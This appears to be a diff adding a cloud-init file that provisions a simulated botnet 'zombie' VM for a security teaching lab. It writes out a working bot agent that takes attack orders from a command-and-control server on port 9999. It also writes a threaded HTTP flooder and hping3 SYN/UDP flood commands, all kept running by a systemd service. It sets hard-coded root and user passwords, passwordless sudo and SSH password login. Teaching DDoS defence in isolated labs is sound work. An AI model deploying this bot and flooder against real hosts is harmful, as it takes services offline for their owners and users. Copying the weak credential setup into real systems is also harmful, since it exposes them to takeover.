@@ -1,0 +1,197 @@
+#cloud-config
+# VM: ATT-Bot1 / ATT-Bot2 - simulated bot/zombie (isolated lab)
+hostname: __HOSTNAME__
+manage_etc_hosts: true
+timezone: Asia/Ho_Chi_Minh
+
+users:
+  - name: bot
+    sudo: ALL=(ALL) NOPASSWD:ALL
+    shell: /bin/bash
+    lock_passwd: false
+    plain_text_passwd: "Bot@123"
+    ssh_authorized_keys:
+      - __SSH_PUBKEY__
+
+chpasswd:
+  list: |
+    root:Bot@123
+    bot:Bot@123
+  expire: false
+
+ssh_pwauth: true
+
+write_files:
+  - path: /opt/bot/bot_agent.py
+    permissions: '0755'
+    content: |
+      #!/usr/bin/env python3
+      """ATT Lab - bot agent (educational simulation).
+
+      Connects to the C2 on TCP/9999 and runs short, bounded traffic tests
+      against the lab victim only. No persistence or propagation logic.
+      """
+      import json
+      import socket
+      import subprocess
+      import sys
+      import threading
+      import time
+
+      C2_IP = sys.argv[1] if len(sys.argv) > 1 else "10.10.10.10"
+      C2_PORT = 9999
+
+
+      def log(msg):
+          print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)
+
+
+      def run_attack(target_ip, target_port, duration, attack_type):
+          log(f"attack -> {target_ip}:{target_port} type={attack_type} "
+              f"duration={duration}s")
+          try:
+              if attack_type == "http":
+                  subprocess.run(
+                      ["python3", "/opt/bot/http_flood.py",
+                       "--target", f"http://{target_ip}:{target_port}",
+                       "--threads", "30",
+                       "--duration", str(duration)],
+                      timeout=duration + 30,
+                  )
+              elif attack_type == "syn":
+                  subprocess.run(
+                      ["hping3", "-S", "--flood", "-p", str(target_port),
+                       target_ip],
+                      timeout=duration + 5,
+                  )
+              elif attack_type == "udp":
+                  subprocess.run(
+                      ["hping3", "--udp", "--flood", "-p", str(target_port),
+                       target_ip],
+                      timeout=duration + 5,
+                  )
+              log("attack finished")
+          except subprocess.TimeoutExpired:
+              log("attack stopped (timeout)")
+          except Exception as exc:
+              log(f"attack error: {exc}")
+
+
+      def connect_forever():
+          while True:
+              try:
+                  log(f"connecting to C2 {C2_IP}:{C2_PORT}")
+                  sock = socket.create_connection((C2_IP, C2_PORT), timeout=10)
+                  # create_connection's timeout also applies to recv(); clear it
+                  # so the command channel blocks instead of reconnecting.
+                  sock.settimeout(None)
+                  sock.sendall(f"BOT ONLINE {socket.gethostname()}\n".encode())
+                  log("connected, waiting for commands")
+                  buf = ""
+                  while True:
+                      data = sock.recv(4096)
+                      if not data:
+                          break
+                      buf += data.decode(errors="replace")
+                      while "\n" in buf:
+                          line, buf = buf.split("\n", 1)
+                          try:
+                              cmd = json.loads(line)
+                          except json.JSONDecodeError:
+                              continue
+                          if cmd.get("cmd") == "attack":
+                              threading.Thread(
+                                  target=run_attack,
+                                  args=(cmd["target_ip"], cmd["target_port"],
+                                        cmd["duration"], cmd["type"]),
+                                  daemon=True,
+                              ).start()
+              except Exception as exc:
+                  log(f"C2 unavailable ({exc}); retrying in 5s")
+                  time.sleep(5)
+
+
+      if __name__ == "__main__":
+          connect_forever()
+
+  - path: /opt/bot/http_flood.py
+    permissions: '0755'
+    content: |
+      #!/usr/bin/env python3
+      """Bounded HTTP request generator used by the lab bot (LOIC-style)."""
+      import argparse
+      import threading
+      import time
+
+      import requests
+
+      parser = argparse.ArgumentParser()
+      parser.add_argument("--target", default="http://10.10.10.30/")
+      parser.add_argument("--threads", type=int, default=30)
+      parser.add_argument("--duration", type=int, default=20)
+      args = parser.parse_args()
+
+      stop_event = threading.Event()
+      stats = {"sent": 0, "errors": 0}
+      lock = threading.Lock()
+
+
+      def worker():
+          session = requests.Session()
+          while not stop_event.is_set():
+              try:
+                  session.get(args.target, timeout=3)
+                  with lock:
+                      stats["sent"] += 1
+              except Exception:
+                  with lock:
+                      stats["errors"] += 1
+
+
+      print(f"[FLOOD] {args.target} threads={args.threads} "
+            f"duration={args.duration}s", flush=True)
+      threads = [threading.Thread(target=worker, daemon=True)
+                 for _ in range(args.threads)]
+      for t in threads:
+          t.start()
+
+      start = time.time()
+      while time.time() - start < args.duration:
+          elapsed = int(time.time() - start)
+          print(f"\r[{elapsed:3d}s] sent={stats['sent']:6d} "
+                f"errors={stats['errors']:5d}", end="", flush=True)
+          time.sleep(1)
+      stop_event.set()
+      print(f"\n[FLOOD] done sent={stats['sent']} errors={stats['errors']}",
+            flush=True)
+
+  - path: /etc/systemd/system/att-bot.service
+    permissions: '0644'
+    content: |
+      [Unit]
+      Description=ATT Lab Bot Agent (simulated)
+      After=network-online.target
+      Wants=network-online.target
+
+      [Service]
+      ExecStart=/usr/bin/python3 /opt/bot/bot_agent.py 10.10.10.10
+      Restart=always
+      RestartSec=5
+      StandardOutput=journal
+      StandardError=journal
+
+      [Install]
+      WantedBy=multi-user.target
+
+runcmd:
+  - |
+    set -u
+    for i in 1 2 3 4 5; do apt-get update -y -q && break; sleep 5; done
+    DEBIAN_FRONTEND=noninteractive apt-get install -y -q \
+      python3 python3-requests hping3 curl net-tools iputils-ping
+    chmod +x /opt/bot/*.py
+    systemctl daemon-reload
+    systemctl enable --now att-bot
+    sleep 2
+    systemctl is-active att-bot || true
+    echo "STATUS: READY $(date -Is) role=bot" > /var/log/att-setup.log
